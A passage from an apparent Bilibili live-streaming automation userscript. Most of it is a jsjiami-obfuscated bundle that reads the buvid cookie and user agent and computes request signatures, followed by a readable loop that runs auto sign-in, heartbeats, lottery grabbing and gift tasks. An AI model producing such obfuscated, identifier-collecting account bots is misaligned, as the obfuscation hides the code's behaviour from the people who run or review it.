\x74\x61\x62\x6c\x65']}),_0x2137d0[_0x3d94('41f','\x7a\x55\x43\x53')]['\x73\x70\x79\x64\x65\x72']=function(_0x35c498,_0x523368){return _0x2137d0[_0x3d94('32a','\x6f\x51\x44\x76')][_0x3d94('420','\x63\x75\x4f\x47')](_0x2137d0[_0x3d94('421','\x6a\x24\x33\x49')][_0x3d94('422','\x42\x5b\x76\x65')][_0x3d94('423','\x63\x26\x53\x39')](_0x2137d0[_0x3d94('1f1','\x5a\x59\x4f\x54')][_0x3d94('424','\x4d\x40\x49\x4d')](_0x35c498),_0x2137d0[_0x3d94('212','\x71\x58\x62\x6c')][_0x3d94('425','\x43\x43\x5a\x7a')](_0x523368)));},_0x9dfd78[_0x3d94('426','\x65\x4f\x21\x7a')](_0x50fe39),BiliPushUtils[_0x3d94('427','\x29\x5e\x36\x61')]=function(_0x35c498,_0x523368){if(CONFIG['\x44\x44\x5f\x42\x50']&&BiliPush['\x63\x6f\x6e\x6e\x65\x63\x74\x65\x64']){if(_0x45367b[_0x3d94('428','\x42\x5b\x76\x65')](_0x45367b[_0x3d94('429','\x71\x58\x62\x6c')],_0x45367b[_0x3d94('42a','\x68\x41\x4e\x34')])){return _0x2137d0[_0x3d94('42b','\x43\x79\x71\x48')]['\x73\x70\x79\x64\x65\x72'](_0x35c498,_0x523368);}else{if(CONFIG[_0x3d94('42c','\x21\x78\x7a\x54')]&&BiliPush[_0x3d94('42d','\x6a\x24\x33\x49')]){return _0x2137d0['\x65\x78\x70\x6f\x72\x74\x73'][_0x3d94('42e','\x6f\x4d\x61\x44')](_0x35c498,_0x523368);}return'';}}return'';},_0x2137d0[_0x3d94('3ea','\x48\x53\x4a\x79')];}}};};},893:function(_0x4ee1a0,_0x38666b,_0x79f69d){var _0x287e09={'\x61\x48\x61\x55\x46':function(_0x4597ef,_0x1f15e0){return _0x4597ef(_0x1f15e0);},'\x68\x66\x4c\x64\x4a':_0x3d94('42f','\x78\x43\x42\x43')};_0x287e09[_0x3d94('430','\x30\x69\x57\x42')](_0x79f69d,0x1f4)(_0x287e09[_0x3d94('431','\x5a\x59\x4f\x54')]);},894:function(_0x1fd1fe,_0x471b33,_0x1b9105){var _0xa8f9eb={'\x4f\x48\x71\x76\x78':function(_0x1eb2b2,_0x346854){return _0x1eb2b2(_0x346854);},'\x51\x44\x47\x54\x68':_0x3d94('432','\x6c\x73\x4e\x61')};_0xa8f9eb[_0x3d94('433','\x21\x78\x7a\x54')](_0x1b9105,0x1f5)(_0xa8f9eb[_0x3d94('434','\x42\x4c\x4a\x4a')]);},895:function(_0x271c66,_0x56f8c7,_0x3b8db9){var _0x485a25={'\x4e\x70\x72\x4b\x55':function(_0x27d8e9,_0xde1d02){return _0x27d8e9===_0xde1d02;},'\x51\x47\x43\x58\x4b':function(_0x251588,_0x334d8b,_0x2850a4){return _0x251588(_0x334d8b,_0x2850a4);},'\x54\x4c\x47\x4f\x68':function(_0xf28d53,_0x14555c){return _0xf28d53!==_0x14555c;},'\x47\x4e\x4b\x48\x4b':_0x3d94('435','\x6e\x62\x69\x46'),'\x4d\x52\x77\x79\x56':'\x6a\x70\x52\x4e\x59','\x41\x6a\x57\x57\x68':function(_0xed0de5,_0x4bf0ba,_0x3f163f){return _0xed0de5(_0x4bf0ba,_0x3f163f);},'\x74\x59\x65\x4f\x47':'\x73\x68\x6d\x7a\x4d','\x6f\x75\x66\x66\x55':function(_0x336b19,_0x594224,_0x513617){return _0x336b19(_0x594224,_0x513617);},'\x4c\x52\x4a\x42\x64':function(_0x3e002c,_0x404a77){return _0x3e002c===_0x404a77;},'\x45\x49\x51\x79\x42':function(_0x3d9d6a,_0x5a366f,_0x3344a4){return _0x3d9d6a(_0x5a366f,_0x3344a4);},'\x70\x69\x67\x59\x73':function(_0x29e7f1,_0x54cb53,_0xd1b33e,_0x28d047,_0x343c6b){return _0x29e7f1(_0x54cb53,_0xd1b33e,_0x28d047,_0x343c6b);},'\x62\x45\x54\x48\x76':function(_0x118902,_0x1fac69){return _0x118902!=_0x1fac69;},'\x58\x4e\x68\x46\x55':function(_0x35fe6a,_0x3af837,_0x62dc2b,_0x18616f,_0x18424b){return _0x35fe6a(_0x3af837,_0x62dc2b,_0x18616f,_0x18424b);},'\x7a\x76\x62\x67\x54':function(_0x3a4cf1,_0x239945){return _0x3a4cf1(_0x239945);},'\x43\x52\x42\x50\x56':function(_0x569fe6,_0x200d1f){return _0x569fe6===_0x200d1f;},'\x69\x51\x7a\x6d\x6a':function(_0x13344f,_0x383d8f,_0x3ea005){return _0x13344f(_0x383d8f,_0x3ea005);},'\x44\x4a\x6c\x48\x4e':function(_0xdb191c,_0x7c9d7c){return _0xdb191c(_0x7c9d7c);},'\x4a\x79\x49\x4e\x4f':function(_0x34cc49,_0x2b339d){return _0x34cc49===_0x2b339d;},'\x6a\x6b\x49\x65\x76':function(_0x194c51,_0x4efe7a,_0x4924cf){return _0x194c51(_0x4efe7a,_0x4924cf);},'\x55\x55\x6c\x4f\x41':function(_0x210338,_0x117b4f){return _0x210338(_0x117b4f);},'\x61\x41\x4f\x53\x6c':function(_0x3a3b69,_0x1d5708,_0x552dff){return _0x3a3b69(_0x1d5708,_0x552dff);},'\x77\x77\x4f\x63\x63':function(_0x47d31e,_0x37371d,_0x418c9b){return _0x47d31e(_0x37371d,_0x418c9b);},'\x42\x42\x4a\x54\x70':function(_0x5acbff,_0x39e402){return _0x5acbff===_0x39e402;},'\x6e\x5a\x49\x76\x49':function(_0x491cec,_0x125061){return _0x491cec(_0x125061);},'\x75\x4d\x6f\x42\x4c':function(_0x162a96,_0x5bf82a){return _0x162a96(_0x5bf82a);},'\x5a\x68\x7a\x54\x6d':function(_0x362aed,_0x2188aa){return _0x362aed(_0x2188aa);},'\x77\x45\x6d\x77\x51':function(_0x276e73,_0x416e5c){return _0x276e73(_0x416e5c);}};'use strict';var _0x3921f7=_0x485a25['\x6e\x5a\x49\x76\x49'](_0x3b8db9,0xb7),_0xccc7ca=_0x485a25[_0x3d94('436','\x4e\x39\x50\x38')](_0x3b8db9,0xb4)['\x67\x65\x74\x57\x65\x61\x6b'],_0x3d38ac=_0x485a25['\x75\x4d\x6f\x42\x4c'](_0x3b8db9,0x14),_0x2d891a=_0x485a25['\x75\x4d\x6f\x42\x4c'](_0x3b8db9,0x1f),_0x3cb867=_0x485a25['\x75\x4d\x6f\x42\x4c'](_0x3b8db9,0xb8),_0x51bc23=_0x485a25['\x5a\x68\x7a\x54\x6d'](_0x3b8db9,0xb5),_0x2327a=_0x485a25[_0x3d94('437','\x42\x5b\x76\x65')](_0x3b8db9,0x1dd),_0x328604=_0x485a25[_0x3d94('438','\x48\x49\x75\x59')](_0x3b8db9,0x20),_0x21316d=_0x485a25[_0x3d94('439','\x63\x26\x53\x39')](_0x3b8db9,0x19b),_0x227c3e=_0x485a25[_0x3d94('43a','\x6f\x4d\x61\x44')](_0x2327a,0x5),_0x58b6c3=_0x485a25[_0x3d94('43b','\x42\x5b\x76\x65')](_0x2327a,0x6),_0x404d49=0x0,_0x44a494=function(_0x271c66){return _0x271c66['\x5f\x6c']||(_0x271c66['\x5f\x6c']=new _0x2c2a9e());},_0x2c2a9e=function(){this['\x61']=[];},_0x385e91=function(_0x271c66,_0x56f8c7){return _0x485a25[_0x3d94('43c','\x42\x5b\x76\x65')](_0x227c3e,_0x271c66['\x61'],function(_0x271c66){return _0x485a25[_0x3d94('43d','\x63\x26\x53\x39')](_0x271c66[0x0],_0x56f8c7);});};_0x2c2a9e[_0x3d94('43e','\x6c\x73\x4e\x61')]={'\x67\x65\x74':function(_0x271c66){if(_0x485a25[_0x3d94('43f','\x30\x69\x57\x42')](_0x485a25[_0x3d94('440','\x63\x75\x4f\x47')],_0x485a25[_0x3d94('441','\x43\x43\x5a\x7a')])){var _0x56f8c7=_0x485a25[_0x3d94('442','\x63\x75\x4f\x47')](_0x385e91,this,_0x271c66);if(_0x56f8c7)return _0x56f8c7[0x1];}else{_0x271c66['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45']['\x66\x72\x6f\x6d\x5f\x6a\x73'](_0x56f8c7,window);}},'\x68\x61\x73':function(_0x271c66){if(_0x485a25[_0x3d94('443','\x73\x5e\x29\x54')](_0x485a25['\x74\x59\x65\x4f\x47'],_0x485a25[_0x3d94('444','\x40\x61\x26\x6d')])){_0x56f8c7=_0x271c66[_0x3d94('32a','\x6f\x51\x44\x76')]['\x74\x6f\x5f\x6a\x73'](_0x56f8c7),_0x271c66['\x53\x54\x44\x57\x45\x42\x5f\x50\x52\x49\x56\x41\x54\x45'][_0x3d94('445','\x42\x5b\x76\x65')](_0x56f8c7);}else{return!!_0x485a25[_0x3d94('446','\x30\x69\x57\x42')](_0x385e91,this,_0x271c66);}},'\x73\x65\x74':function(_0x271c66,_0x56f8c7){var _0x3b8db9=_0x485a25[_0x3d94('447','\x39\x2a\x72\x56')](_0x385e91,this,_0x271c66);_0x3b8db9?_0x3b8db9[0x1]=_0x56f8c7:this['\x61'][_0x3d94('448','\x40\x61\x26\x6d')]([_0x271c66,_0x56f8c7]);},'\x64\x65\x6c\x65\x74\x65':function(_0x271c66){var _0x56f8c7=_0x485a25[_0x3d94('449','\x24\x59\x36\x72')](_0x58b6c3,this['\x61'],function(_0x56f8c7){return _0x485a25[_0x3d94('44a','\x6d\x34\x4e\x42')](_0x56f8c7[0x0],_0x271c66);});return~_0x56f8c7&&this['\x61']['\x73\x70\x6c\x69\x63\x65'](_0x56f8c7,0x1),!!~_0x56f8c7;}},_0x271c66[_0x3d94('44b','\x30\x69\x57\x42')]={'\x67\x65\x74\x43\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72':function(_0x271c66,_0x56f8c7,_0x3b8db9,_0x3d38ac){var _0x2a7755={'\x79\x79\x79\x51\x58':function(_0x438e98,_0x1226d5){return _0x485a25[_0x3d94('44c','\x6e\x62\x69\x46')](_0x438e98,_0x1226d5);},'\x6b\x74\x54\x63\x56':function(_0x9b1fa7,_0x4e9155){return _0x485a25[_0x3d94('44d','\x4d\x40\x49\x4d')](_0x9b1fa7,_0x4e9155);},'\x4a\x51\x51\x41\x66':function(_0x66d7ee,_0x4fc154){return _0x485a25[_0x3d94('44e','\x43\x43\x5a\x7a')](_0x66d7ee,_0x4fc154);},'\x76\x43\x67\x44\x4e':function(_0x21f131,_0xf1931d){return _0x485a25[_0x3d94('44f','\x24\x70\x59\x5b')](_0x21f131,_0xf1931d);},'\x6d\x46\x56\x49\x59':function(_0x397457,_0x59625e,_0x4b6b4e){return _0x485a25['\x69\x51\x7a\x6d\x6a'](_0x397457,_0x59625e,_0x4b6b4e);},'\x7a\x4b\x51\x41\x51':function(_0xec5325,_0x597e54,_0x34f53e){return _0x485a25[_0x3d94('450','\x66\x68\x7a\x4e')](_0xec5325,_0x597e54,_0x34f53e);}};var _0x2327a=_0x485a25[_0x3d94('451','\x26\x4c\x67\x57')](_0x271c66,function(_0x271c66,_0x3921f7){_0x485a25[_0x3d94('452','\x26\x4c\x67\x57')](_0x3cb867,_0x271c66,_0x2327a,_0x56f8c7,'\x5f\x69'),_0x271c66['\x5f\x74']=_0x56f8c7,_0x271c66['\x5f\x69']=_0x404d49++,_0x271c66['\x5f\x6c']=void 0x0,_0x485a25[_0x3d94('453','\x43\x29\x5d\x66')](void 0x0,_0x3921f7)&&_0x485a25[_0x3d94('454','\x6f\x51\x44\x76')](_0x51bc23,_0x3921f7,_0x3b8db9,_0x271c66[_0x3d38ac],_0x271c66);});return _0x485a25[_0x3d94('455','\x78\x43\x42\x43')](_0x3921f7,_0x2327a[_0x3d94('456','\x24\x59\x36\x72')],{'\x64\x65\x6c\x65\x74\x65':function(_0x271c66){if(!_0x485a25['\x7a\x76\x62\x67\x54'](_0x2d891a,_0x271c66))return!0x1;var _0x3b8db9=_0x485a25[_0x3d94('457','\x73\x5e\x29\x54')](_0xccc7ca,_0x271c66);return _0x485a25[_0x3d94('458','\x5a\x59\x4f\x54')](!0x0,_0x3b8db9)?_0x485a25[_0x3d94('459','\x66\x68\x7a\x4e')](_0x44a494,_0x485a25[_0x3d94('45a','\x43\x79\x71\x48')](_0x21316d,this,_0x56f8c7))['\x64\x65\x6c\x65\x74\x65'](_0x271c66):_0x3b8db9&&_0x485a25['\x69\x51\x7a\x6d\x6a'](_0x328604,_0x3b8db9,this['\x5f\x69'])&&delete _0x3b8db9[this['\x5f\x69']];},'\x68\x61\x73':function(_0x271c66){if(!_0x2a7755[_0x3d94('45b','\x5a\x59\x4f\x54')](_0x2d891a,_0x271c66))return!0x1;var _0x3b8db9=_0x2a7755[_0x3d94('45c','\x24\x70\x59\x5b')](_0xccc7ca,_0x271c66);return _0x2a7755[_0x3d94('45d','\x6f\x51\x44\x76')](!0x0,_0x3b8db9)?_0x2a7755[_0x3d94('45e','\x7a\x55\x43\x53')](_0x44a494,_0x2a7755[_0x3d94('45f','\x42\x4c\x4a\x4a')](_0x21316d,this,_0x56f8c7))[_0x3d94('460','\x40\x61\x26\x6d')](_0x271c66):_0x3b8db9&&_0x2a7755[_0x3d94('461','\x38\x67\x4e\x79')](_0x328604,_0x3b8db9,this['\x5f\x69']);}}),_0x2327a;},'\x64\x65\x66':function(_0x271c66,_0x56f8c7,_0x3b8db9){var _0x3921f7=_0x485a25[_0x3d94('462','\x6a\x36\x4b\x43')](_0xccc7ca,_0x485a25['\x55\x55\x6c\x4f\x41'](_0x3d38ac,_0x56f8c7),!0x0);return _0x485a25[_0x3d94('463','\x35\x70\x35\x57')](!0x0,_0x3921f7)?_0x485a25[_0x3d94('464','\x43\x79\x71\x48')](_0x44a494,_0x271c66)['\x73\x65\x74'](_0x56f8c7,_0x3b8db9):_0x3921f7[_0x271c66['\x5f\x69']]=_0x3b8db9,_0x271c66;},'\x75\x66\x73\x74\x6f\x72\x65':_0x44a494};},896:function(_0x3d0a68,_0x523ddd,_0x51e8f4){var _0x300b0f={'\x52\x71\x55\x6a\x56':function(_0x10412b,_0x459a0d,_0x2cf5d8){return _0x10412b(_0x459a0d,_0x2cf5d8);},'\x61\x75\x71\x4d\x7a':function(_0x38ab5b,_0x23a286){return _0x38ab5b>_0x23a286;},'\x56\x66\x67\x6d\x46':function(_0x1016e1,_0x5a793f){return _0x1016e1!==_0x5a793f;},'\x55\x51\x56\x6d\x47':_0x3d94('465','\x38\x67\x4e\x79'),'\x68\x6f\x7a\x47\x73':_0x3d94('466','\x6d\x34\x4e\x42'),'\x61\x75\x58\x66\x43':function(_0x3d110b,_0x4ccca){return _0x3d110b(_0x4ccca);},'\x77\x4d\x6a\x69\x6a':_0x3d94('467','\x28\x52\x36\x6a'),'\x54\x59\x79\x77\x41':function(_0x588a4c){return _0x588a4c();},'\x63\x76\x67\x6d\x6e':function(_0xd8a379,_0x4f366a){return _0xd8a379!==_0x4f366a;},'\x66\x4a\x73\x62\x70':_0x3d94('468','\x38\x67\x4e\x79'),'\x72\x75\x6c\x69\x56':_0x3d94('469','\x66\x5a\x29\x53'),'\x66\x46\x6e\x4f\x58':function(_0x31f0d8,_0x9f2568){return _0x31f0d8===_0x9f2568;},'\x62\x63\x7a\x73\x47':function(_0x56fdf8,_0x430504){return _0x56fdf8(_0x430504);},'\x6b\x72\x72\x74\x59':function(_0x57f793,_0x3bd472,_0x4b370b){return _0x57f793(_0x3bd472,_0x4b370b);},'\x63\x76\x74\x51\x4d':_0x3d94('46a','\x63\x75\x4f\x47'),'\x4e\x72\x56\x48\x72':_0x3d94('46b','\x39\x2a\x72\x56'),'\x6a\x4c\x4e\x77\x6d':_0x3d94('46c','\x7a\x55\x43\x53'),'\x4a\x70\x6e\x43\x67':function(_0x38817a,_0x477671){return _0x38817a(_0x477671);},'\x75\x76\x76\x44\x7a':function(_0x488b73,_0x46f06d){return _0x488b73==_0x46f06d;},'\x44\x78\x55\x76\x56':_0x3d94('46d','\x64\x58\x4c\x72'),'\x4e\x51\x4c\x51\x4a':function(_0x4dbf64,_0x4b2790,_0x33e375,_0x14be33){return _0x4dbf64(_0x4b2790,_0x33e375,_0x14be33);},'\x64\x4b\x54\x47\x47':function(_0x964c28,_0x22649c){return _0x964c28(_0x22649c);},'\x59\x55\x47\x67\x6d':function(_0x475f02,_0x31072b){return _0x475f02(_0x31072b);},'\x61\x54\x73\x4d\x51':function(_0x1cbe04,_0x3e994c){return _0x1cbe04(_0x3e994c);},'\x66\x65\x6d\x71\x48':function(_0x1c470d,_0x1a5133){return _0x1c470d in _0x1a5133;},'\x66\x46\x79\x4b\x69':'\x41\x63\x74\x69\x76\x65\x58\x4f\x62\x6a\x65\x63\x74','\x64\x72\x73\x44\x6d':function(_0x3a2e18,_0x4debe6){return _0x3a2e18&&_0x4debe6;},'\x69\x77\x51\x6a\x4c':function(_0x249859,_0x344678,_0x17b53c){return _0x249859(_0x344678,_0x17b53c);},'\x59\x5a\x4a\x50\x4e':function(_0x2e16be,_0x576857,_0x55d1e5){return _0x2e16be(_0x576857,_0x55d1e5);},'\x6f\x68\x41\x4d\x79':'\x64\x65\x6c\x65\x74\x65','\x6f\x54\x57\x58\x69':'\x68\x61\x73','\x42\x46\x7a\x6d\x51':_0x3d94('46e','\x57\x71\x46\x36')};'use strict';var _0x5063ab,_0x165751=_0x300b0f[_0x3d94('46f','\x6e\x62\x69\x46')](_0x51e8f4,0xa),_0x55d69a=_0x300b0f[_0x3d94('470','\x39\x2a\x72\x56')](_0x51e8f4,0x1dd)(0x0),_0x1b4f5d=_0x300b0f[_0x3d94('470','\x39\x2a\x72\x56')](_0x51e8f4,0x82),_0x53af9b=_0x300b0f['\x64\x4b\x54\x47\x47'](_0x51e8f4,0xb4),_0x2f4cfd=_0x300b0f[_0x3d94('471','\x4d\x40\x49\x4d')](_0x51e8f4,0xb9),_0x3bc0d7=_0x300b0f[_0x3d94('472','\x6a\x24\x33\x49')](_0x51e8f4,0x37f),_0x11190c=_0x300b0f[_0x3d94('473','\x38\x67\x4e\x79')](_0x51e8f4,0x1f),_0x20f3b5=_0x300b0f[_0x3d94('474','\x79\x49\x51\x23')](_0x51e8f4,0x19b),_0x1739a4=_0x300b0f[_0x3d94('475','\x71\x58\x62\x6c')](_0x51e8f4,0x19b),_0x44d049=!_0x165751[_0x3d94('476','\x29\x5e\x36\x61')]&&_0x300b0f[_0x3d94('477','\x63\x75\x4f\x47')](_0x300b0f[_0x3d94('478','\x78\x43\x42\x43')],_0x165751),_0x195c5d=_0x53af9b[_0x3d94('479','\x71\x58\x62\x6c')],_0x53b2d7=Object[_0x3d94('47a','\x5a\x59\x4f\x54')],_0x28454c=_0x3bc0d7[_0x3d94('47b','\x28\x52\x36\x6a')],_0x4896ae=function(_0x3d0a68){if(_0x300b0f[_0x3d94('47c','\x28\x52\x36\x6a')](_0x300b0f[_0x3d94('47d','\x71\x58\x62\x6c')],_0x300b0f[_0x3d94('47e','\x43\x43\x5a\x7a')])){_0x51e8f4=_0x3d0a68[_0x3d94('88','\x6e\x48\x77\x36')][_0x3d94('47f','\x24\x59\x36\x72')](_0x51e8f4),_0x3d0a68[_0x3d94('480','\x66\x5a\x29\x53')][_0x3d94('481','\x6e\x62\x69\x46')](_0x523ddd,_0x51e8f4[_0x3d94('482','\x70\x59\x51\x52')]);}else{return function(){return _0x300b0f[_0x3d94('483','\x48\x49\x75\x59')](_0x3d0a68,this,_0x300b0f[_0x3d94('484','\x71\x58\x62\x6c')](arguments[_0x3d94('485','\x39\x46\x26\x44')],0x0)?arguments[0x0]:void 0x0);};}},_0xb4ea8d={'\x67\x65\x74':function(_0x3d0a68){if(_0x300b0f[_0x3d94('486','\x6c\x73\x4e\x61')](_0x300b0f[_0x3d94('487','\x79\x49\x51\x23')],_0x300b0f[_0x3d94('488','\x57\x71\x46\x36')])){if(_0x300b0f['\x61\x75\x58\x66\x43'](_0x11190c,_0x3d0a68)){var _0x523ddd=_0x300b0f[_0x3d94('489','\x4d\x40\x49\x4d')](_0x195c5d,_0x3d0a68);return _0x300b0f['\x66\x46\x6e\x4f\x58'](!0x0,_0x523ddd)?_0x300b0f[_0x3d94('48a','\x39\x2a\x72\x56')](_0x28454c,_0x300b0f['\x6b\x72\x72\x74\x59'](_0x20f3b5,this,_0x300b0f['\x63\x76\x74\x51\x4d']))['\x67\x65\x74'](_0x3d0a68):_0x523ddd?_0x523ddd[this['\x5f\x69']]:void 0x0;}}else{var _0xaf10f7=_0x300b0f[_0x3d94('48b','\x48\x49\x75\x59')]['\x73\x70\x6c\x69\x74']('\x7c'),_0x5be9a4=0x0;while(!![]){switch(_0xaf10f7[_0x5be9a4++]){case'\x30':this['\x65\x72\x72\x6f\x72']=0x0;continue;case'\x31':;continue;case'\x32':this[_0x3d94('11','\x43\x29\x5d\x66')]=info[_0x3d94('48c','\x6c\x73\x4e\x61')];continue;case'\x33':this['\x62\x75\x76\x69\x64']=_0x300b0f['\x61\x75\x58\x66\x43'](getCookie,_0x300b0f[_0x3d94('48d','\x43\x79\x71\x48')]);continue;case'\x34':this[_0x3d94('48e','\x6f\x51\x44\x76')]();continue;case'\x35':this['\x75\x61']=window&&window['\x6e\x61\x76\x69\x67\x61\x74\x6f\x72']?window[_0x3d94('48f','\x43\x43\x5a\x7a')][_0x3d94('490','\x51\x6a\x52\x40')]:'';continue;case'\x36':this[_0x3d94('b','\x21\x78\x7a\x54')]=info[_0x3d94('491','\x70\x59\x51\x52')];continue;case'\x37':this[_0x3d94('492','\x6f\x51\x44\x76')]=new Date();continue;case'\x38':this['\x73\x65\x71']=0x0;continue;case'\x39':this['\x69\x6e\x66\x6f']=info;continue;case'\x31\x30':this[_0x3d94('493','\x66\x5a\x29\x53')]=info[_0x3d94('494','\x66\x5a\x29\x53')];continue;case'\x31\x31':this['\x75\x75\x69\x64']=_0x300b0f[_0x3d94('495','\x24\x70\x59\x5b')](UUID);continue;}break;}}},'\x73\x65\x74':function(_0x3d0a68,_0x523ddd){if(_0x300b0f[_0x3d94('496','\x31\x79\x25\x2a')](_0x300b0f[_0x3d94('497','\x48\x49\x75\x59')],_0x300b0f[_0x3d94('498','\x6a\x24\x33\x49')])){return _0x3bc0d7[_0x3d94('499','\x43\x29\x5d\x66')](_0x300b0f[_0x3d94('49a','\x63\x26\x53\x39')](_0x20f3b5,this,_0x300b0f[_0x3d94('49b','\x28\x52\x36\x6a')]),_0x3d0a68,_0x523ddd);}else{_0x51e8f4=_0x3d0a68[_0x3d94('7c','\x30\x69\x57\x42')][_0x3d94('49c','\x57\x71\x46\x36')](_0x51e8f4),_0x3d0a68[_0x3d94('409','\x63\x26\x53\x39')]['\x66\x72\x6f\x6d\x5f\x6a\x73'](_0x523ddd,function(){try{return{'\x76\x61\x6c\x75\x65':_0x51e8f4[_0x3d94('49d','\x66\x5a\x29\x53')],'\x73\x75\x63\x63\x65\x73\x73':!0x0};}catch(_0x4b070f){return{'\x65\x72\x72\x6f\x72':_0x4b070f,'\x73\x75\x63\x63\x65\x73\x73':!0x1};}}());}}},_0x3bc0bb=_0x3d0a68[_0x3d94('49e','\x48\x49\x75\x59')]=_0x300b0f[_0x3d94('475','\x71\x58\x62\x6c')](_0x51e8f4,0x1f6)(_0x300b0f[_0x3d94('49f','\x4e\x39\x50\x38')],_0x4896ae,_0xb4ea8d,_0x3bc0d7,!0x0,!0x0);_0x300b0f[_0x3d94('4a0','\x42\x5b\x76\x65')](_0x1739a4,_0x44d049)&&(_0x300b0f[_0x3d94('4a1','\x71\x58\x62\x6c')](_0x2f4cfd,(_0x5063ab=_0x3bc0d7[_0x3d94('4a2','\x21\x78\x7a\x54')](_0x4896ae,_0x300b0f[_0x3d94('4a3','\x79\x49\x51\x23')]))[_0x3d94('290','\x4e\x39\x50\x38')],_0xb4ea8d),_0x53af9b['\x4e\x45\x45\x44']=!0x0,_0x300b0f[_0x3d94('4a4','\x6f\x4d\x61\x44')](_0x55d69a,[_0x300b0f[_0x3d94('4a5','\x63\x26\x53\x39')],_0x300b0f['\x6f\x54\x57\x58\x69'],_0x300b0f[_0x3d94('4a6','\x30\x69\x57\x42')],_0x300b0f['\x44\x78\x55\x76\x56']],function(_0x3d0a68){var _0x523ddd=_0x3bc0bb[_0x3d94('4a7','\x6e\x48\x77\x36')],_0x51e8f4=_0x523ddd[_0x3d0a68];_0x300b0f[_0x3d94('4a8','\x71\x58\x62\x6c')](_0x1b4f5d,_0x523ddd,_0x3d0a68,function(_0x523ddd,_0x165751){if(_0x300b0f[_0x3d94('4a9','\x24\x59\x36\x72')](_0x11190c,_0x523ddd)&&!_0x300b0f[_0x3d94('4aa','\x70\x59\x51\x52')](_0x53b2d7,_0x523ddd)){this['\x5f\x66']||(this['\x5f\x66']=new _0x5063ab());var _0x55d69a=this['\x5f\x66'][_0x3d0a68](_0x523ddd,_0x165751);return _0x300b0f[_0x3d94('4ab','\x21\x78\x7a\x54')](_0x300b0f['\x44\x78\x55\x76\x56'],_0x3d0a68)?this:_0x55d69a;}return _0x51e8f4[_0x3d94('4ac','\x24\x70\x59\x5b')](this,_0x523ddd,_0x165751);});}));},897:function(_0x54a048,_0x45384c,_0x1bb032){var _0xbde0bc={'\x4a\x4f\x43\x68\x66':function(_0x3c3303,_0x8eaf9e){return _0x3c3303(_0x8eaf9e);},'\x69\x5a\x59\x5a\x73':function(_0x31c367,_0x310981){return _0x31c367(_0x310981);},'\x45\x62\x75\x52\x52':function(_0x2e4531,_0x24931a){return _0x2e4531(_0x24931a);},'\x73\x59\x55\x68\x6c':function(_0x42e9bd,_0x454c40){return _0x42e9bd(_0x454c40);}};_0xbde0bc[_0x3d94('4ad','\x66\x5a\x29\x53')](_0x1bb032,0x80),_0xbde0bc[_0x3d94('4ae','\x6c\x73\x4e\x61')](_0x1bb032,0x57),_0xbde0bc[_0x3d94('4af','\x29\x5e\x36\x61')](_0x1bb032,0x380),_0xbde0bc[_0x3d94('4b0','\x35\x70\x35\x57')](_0x1bb032,0x37e),_0xbde0bc[_0x3d94('4b1','\x66\x68\x7a\x4e')](_0x1bb032,0x37d),_0x54a048['\x65\x78\x70\x6f\x72\x74\x73']=_0xbde0bc[_0x3d94('4b2','\x42\x5b\x76\x65')](_0x1bb032,0x7)[_0x3d94('4b3','\x43\x43\x5a\x7a')];},898:function(_0x3e0d83,_0x37915b,_0x396cb1){var _0x37c014={'\x6a\x4b\x4c\x70\x6b':function(_0x2efb9c,_0x248b7a){return _0x2efb9c(_0x248b7a);}};_0x3e0d83[_0x3d94('4b4','\x43\x29\x5d\x66')]={'\x64\x65\x66\x61\x75\x6c\x74':_0x37c014[_0x3d94('4b5','\x7a\x55\x43\x53')](_0x396cb1,0x381),'\x5f\x5f\x65\x73\x4d\x6f\x64\x75\x6c\x65':!0x0};}}]);;_0xodB='jsjiami.com.v6';

        const Run = async () => {
            await TokenLoad();
            // 每天一次
            Statistics.run();
            if (CONFIG.AUTO_SIGN) Sign.run();
            if (CONFIG.SILVER2COIN) Exchange.run();
            if (CONFIG.AUTO_GROUP_SIGN) GroupSign.run();
            if (CONFIG.AUTO_DAILYREWARD) DailyReward.run();
            if (CONFIG.MOBILE_HEARTBEAT) {
                MobileHeartbeat.run();
                WebHeartbeat.run();
            }
            //if (CONFIG.AUTO_GROUP_SIGN || CONFIG.AUTO_DAILYREWARD) createIframe('//api.live.bilibili.com', 'GROUPSIGN|DAILYREWARD');
            // 每过一定时间一次
            if (CONFIG.AUTO_TASK) Task.run();
            if (CONFIG.AUTO_GIFT) Gift.run();
            // 持续运行
            if (CONFIG.AUTO_TREASUREBOX) TreasureBox.run();
            if (CONFIG.AUTO_LOTTERY) Lottery.run();
            RafflePorcess.run();
            TopRankTask.run();
            HeartGift.run();
            BiliPush.run();
        };

        $(document).ready(() => {
            Init().then(Run);
        });
    }
})();
